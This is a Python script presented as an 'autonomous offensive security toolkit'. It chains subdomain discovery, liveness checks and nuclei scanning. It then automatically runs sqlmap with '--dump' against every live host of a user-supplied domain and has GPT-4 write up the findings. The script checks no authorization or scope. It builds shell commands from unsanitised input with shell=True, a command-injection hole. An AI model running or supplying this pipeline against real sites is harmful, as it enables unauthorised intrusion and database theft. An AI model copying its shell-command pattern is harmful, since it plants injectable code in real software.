# XReconAI: Fully Autonomous Offensive Security Toolkit

import os
import subprocess
import argparse
import yaml
import openai
from datetime import datetime

# Load configuration
def load_config():
    with open("config.yaml", "r") as f:
        return yaml.safe_load(f)

# Recon using subfinder
def run_recon(domain):
    output_file = f"outputs/{domain}_subs.txt"
    os.makedirs("outputs", exist_ok=True)
    cmd = f"subfinder -d {domain} -silent -o {output_file}"
    subprocess.run(cmd, shell=True)
    return output_file

# Liveness check using httpx
def check_live_hosts(subs_file):
    live_file = subs_file.replace("_subs", "_live")
    cmd = f"httpx -l {subs_file} -silent -o {live_file}"
    subprocess.run(cmd, shell=True)
    return live_file

# Vulnerability scan using nuclei
def run_nuclei(live_file):
    results_file = live_file.replace("_live", "_nuclei")
    cmd = f"nuclei -l {live_file} -o {results_file}"
    subprocess.run(cmd, shell=True)
    return results_file

# Exploit SQLi using sqlmap
def run_sqlmap(urls_file):
    with open(urls_file, "r") as f:
        targets = f.read().splitlines()
    for url in targets:
        cmd = f"sqlmap -u {url} --batch --level=2 --risk=2 --dump"
        subprocess.run(cmd, shell=True)

# Use GPT to explain the scan findings
def gpt_explain(findings_file, api_key):
    openai.api_key = api_key
    with open(findings_file, "r") as f:
        findings = f.read()
    prompt = f"Explain the following web vulnerabilities in human-readable format:\n{findings}"
    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[{"role": "user", "content": prompt}]
    )
    explanation = response["choices"][0]["message"]["content"]
    output_file = findings_file.replace(".txt", "_explained.txt")
    with open(output_file, "w") as f:
        f.write(explanation)
    return output_file

# Generate report
def generate_report(domain, findings, explanation):
    report_file = f"outputs/{domain}_report.md"
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(report_file, "w") as f:
        f.write(f"# XReconAI Report for {domain}\n")
        f.write(f"**Scan Time:** {now}\n\n")
        f.write("## Raw Findings\n")
        with open(findings, "r") as raw:
            f.write("```")
            f.write(raw.read())
            f.write("```")
        f.write("\n\n## AI Explanation\n")
        with open(explanation, "r") as exp:
            f.write(exp.read())
    return report_file

# Main workflow
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--domain", required=True, help="Target domain to scan")
    args = parser.parse_args()

    config = load_config()
    api_key = config.get("openai_api_key")

    subs = run_recon(args.domain)
    live = check_live_hosts(subs)
    findings = run_nuclei(live)
    run_sqlmap(live)
    explained = gpt_explain(findings, api_key)
    report = generate_report(args.domain, findings, explained)

    print(f"[+] Scan complete. Report saved to: {report}")

if __name__ == "__main__":
    main()
